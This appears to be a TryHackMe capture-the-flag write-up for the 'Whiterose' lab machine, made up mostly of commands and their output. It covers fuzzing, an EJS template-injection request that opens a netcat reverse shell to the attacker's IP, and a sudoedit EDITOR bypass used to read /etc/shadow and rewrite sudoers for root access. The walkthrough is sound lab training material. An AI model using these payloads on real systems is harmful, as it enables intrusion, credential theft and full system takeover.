---
title: Whiterose
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Whiterose
  machine on TryHackMe.
slug: whiterose
---




> first nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: 416 Requested Range Not Satisfiable
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                  
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                       
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


```
❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H "Host:FUZZ.cyprusbank.thm" -fw 1
________________________________________________

www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 390ms]
admin          

```


```
Olivia Cortez - olivi8
Gayle Bev - p~]P@5!6;rs558:q

```

```
❯ ffuf -u 'http://admin.cyprusbank.thm/settings' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: connect.sid=s%3AsoBA8h9k8wD7SwX8kIhOE0COJ0ZiYpd_.0IsO2h84GZBQeUXTRscbS5obvi8qk8GB%2BQWHexNyK%2Fg' -mc all -d 'name=test&password=test&FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 100 -fs 2098

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://admin.cyprusbank.thm/settings
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: connect.sid=s%3AsoBA8h9k8wD7SwX8kIhOE0COJ0ZiYpd_.0IsO2h84GZBQeUXTRscbS5obvi8qk8GB%2BQWHexNyK%2Fg
 :: Data             : name=test&password=test&FUZZ=test
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response size: 2098
________________________________________________

password                [Status: 200, Size: 2103, Words: 427, Lines: 59, Duration: 1244ms]
include                 [Status: 500, Size: 1388, Words: 80, Lines: 11, Duration: 1729ms]
error                   [Status: 200, Size: 1467, Words: 281, Lines: 49, Duration: 1751ms]
message                 [Status: 200, Size: 2159, Words: 444, Lines: 61, Duration: 1022ms]
client                  [Status: 500, Size: 1399, Words: 80, Lines: 11, Duration: 1554ms]

```



```
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
Content-Length: 156
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://admin.cyprusbank.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://admin.cyprusbank.thm/settings
Accept-Encoding: gzip, deflate, br
Cookie: connect.sid=s%3AukFjA-XkmVVp9DfUoHMzrngAOtRqIbCd.mFUIQlrJiCkpaEavbF%2FPHGqRtr1ccSVHXdWkpB41bWc
Connection: keep-alive

name=x&password=x&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.21.16.42 1337 -e bash');s
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.21.16.42] from (UNKNOWN) [10.201.43.252] 59294

which python

which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
web@cyprusbank:~/app$ export TERM=xterm
export TERM=xterm
web@cyprusbank:~/app$ ^Z
[1]+  Stopped                 nc -lnvp 1337

┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
stty rows 38 columns 116
nc -lnvp 1337

web@cyprusbank:~/app$

```

```
web@cyprusbank:~/app$ ls
components  node_modules  package-lock.json  static
index.js    package.json  routes             views
web@cyprusbank:~/app$ cd /home                                                                                                                            
web@cyprusbank:/home$ ls                                                                                                                                  
web                                                                                                                                                        
web@cyprusbank:/home$ cd web                                                                                                                               
web@cyprusbank:~$ ls                                                                                                                                       
app  user.txt                                                                                                                                              
web@cyprusbank:~$ cat user.txt

```

```
web@cyprusbank:~$ sudo -l                                                                                                                                  
Matching Defaults entries for web on cyprusbank:                                                                                                           
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR                                                                            
    XFILESEARCHPATH XUSERFILESEARCHPATH",                                                                                                                  
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
web@cyprusbank:~$ export EDITOR="vi -- /etc/shadow"
web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
sudo: sudoedit doesn't need to be run via sudo
sudo: --: editing files in a writable directory is not permitted
[1]+  Stopped                 
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

```

> above we can see root hash

```
web@cyprusbank:~$ export EDITOR="vi -- /root/root.txt"
web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
sudo: sudoedit doesn't need to be run via sudo
sudo: --: editing files in a writable directory is not permitted
2 files to edit
web@cyprusbank:~$             sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

> above we can see root.txt but we exploit that cve `sudoeditbypass`

```
##
## User privilege specification
##
root ALL=(ALL:ALL) ALL

## Uncomment to allow members of group wheel to execute any command


## Same thing without a password
# %wheel ALL=(ALL:ALL) NOPASSWD: ALL

## Uncomment to allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
web     ALL=(root) NOPASSWD: ALL
## Uncomment to allow any user to run sudo if they know the password
## of the user they are running the command as (root by default).
# Defaults targetpw  # Ask for the password of the target user
# ALL ALL=(ALL:ALL) ALL  # WARNING: only use this together with 'Defaults targett
pw'

## Read drop-in files from /etc/sudoers.d
@includedir /etc/sudoers.d
~                                                                               
-- INSERT --                         
```

```
web@cyprusbank:~$ export EDITOR="vi -- /etc/sudoers"
web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
sudo: sudoedit doesn't need to be run via sudo
sudo: --: editing files in a writable directory is not permitted
2 files to edit
sudo: /etc/nginx/sites-available/admin.cyprusbank.thm unchanged
web@cyprusbank:~$ sudo su
root@cyprusbank:/home/web# cd /root
root@cyprusbank:~# ls
clean.sh  root.txt
root@cyprusbank:~# cat root.txt

```